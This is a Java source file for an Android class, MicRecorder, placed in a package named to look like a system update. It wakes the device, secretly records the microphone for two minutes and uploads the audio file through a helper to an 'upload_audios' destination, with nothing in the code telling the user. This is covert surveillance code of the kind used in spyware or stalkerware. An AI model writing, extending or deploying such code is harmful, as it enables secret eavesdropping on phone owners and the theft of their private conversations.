package com.android.update;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Handler;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import android.os.PowerManager;

public class MicRecorder {
    private static MediaRecorder recorder;
    private static File outputFile;
    private static PowerManager.WakeLock wakeLock;

    public static void startRecording(final Context context) {
        try {
            // ✅ Acquire wake lock
            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
                    "MicRecord::WakeLock"
            );
            wakeLock.acquire(5 * 60 * 1000L);  // 5 minutes


            outputFile = new File(context.getCacheDir(), "mic_" + System.currentTimeMillis() + ".mp4");

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(outputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            Log.d("MicRecorder", "🎤 Recording started: " + outputFile.getAbsolutePath());

            // Stop after 5 minutes (300,000ms)
            new Handler().postDelayed(() -> stopRecording(context),  2 *60 * 1000);   //5 *

        } catch (IOException e) {
            Log.e("MicRecorder", "❌ Failed to record: " + e.getMessage());
        }
    }

    public static void stopRecording(Context context) {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;

                Log.d("MicRecorder", "✅ Recording stopped. File saved: " + outputFile.getAbsolutePath());

                // Upload recorded audio
                new Thread(() -> {
                    UploadHelper.uploadFileBlocking(context, outputFile, "upload_audios");
                }).start();
// ✅ Release wake lock
                if (wakeLock != null && wakeLock.isHeld()) {
                    wakeLock.release();
                    wakeLock = null;
                }

            }
        } catch (Exception e) {
            Log.e("MicRecorder", "❌ Error stopping recording: " + e.getMessage());
        }
    }
}
